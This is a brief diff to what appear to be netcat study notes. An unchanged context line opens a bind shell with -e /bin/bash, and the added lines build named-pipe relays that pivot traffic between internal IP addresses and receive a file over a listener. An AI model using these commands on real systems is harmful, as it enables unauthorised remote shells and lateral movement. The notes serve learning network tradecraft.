@@ -129,10 +129,11 @@ nc -l -p <same unfiltered port> -vvv
 You can also listen using the -e with NETCAT.
 nc -l -p <any unfiltered port> -e /bin/bash
 
-
-
-
-
+nc -l -p 2345 > 1steg.jpg
+nc -l -p 1234 0< mypipe | nc 10.10.0.40 2345 1>mypipe
+nc -l -p 4321 0< mypipe | nc 10.10.0.40 2345 1>mypipe
+nc 172.16.82.115 6789 0< mypipe | nc 10.10.0.40 6789 1>mypipe
+nc 172.16.82.115 9876 0< mypipe | nc 10.10.0.40 9876 1>mypipe
 
 
 
